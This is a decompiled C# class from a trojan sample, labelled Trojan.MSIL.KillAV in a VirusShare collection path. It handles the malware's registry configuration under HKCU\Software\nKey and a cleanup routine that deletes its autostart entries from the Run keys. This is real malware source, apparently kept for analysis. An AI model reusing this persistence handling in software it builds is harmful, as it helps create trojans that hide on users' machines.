// Decompiled with JetBrains decompiler
// Type: n.NK
// Assembly: yes, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 83EB8C5F-168C-47FA-93FE-E25AA6C64B02
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Trojan.MSIL.KillAV.ao-bc0c15043485dde908fef22878901941295e9096cd86dde81e043e0a083e1c6c.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;

namespace n
{
  [StandardModule]
  public sealed class NK
  {
    public static string Key = "HKEY_CURRENT_USER\\Software\\nKey";
    public static Registry R;

    public static void SetValue(ref string N, ref string V) => Registry.SetValue(NK.Key, N, (object) V, RegistryValueKind.String);

    public static string GetValue(ref string N, ref string DF)
    {
      string Left = Conversions.ToString(Registry.GetValue(NK.Key, N, (object) null));
      return Operators.CompareString(Left, (string) null, false) == 0 ? DF : Left;
    }

    public static void DeleteValue(ref string N)
    {
      Array Instance = (Array) Strings.Split(NK.Key, "\\");
      string name = NK.Key.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object) Instance, new object[1]
      {
        (object) 0
      }, (string[]) null), (object) "\\")), "");
      Registry.CurrentUser.OpenSubKey(name, true).DeleteValue(N);
    }

    public static void CLEAR()
    {
      string su = B.SU;
      B.SU = "*";
      if (Operators.CompareString(su, "*", false) != 0)
      {
        try
        {
          Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue(su);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue(su);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      try
      {
        Array Instance = (Array) Strings.Split(NK.Key, "\\");
        Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance, new object[1]
        {
          (object) checked (Instance.Length - 1)
        }, (string[]) null)), false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
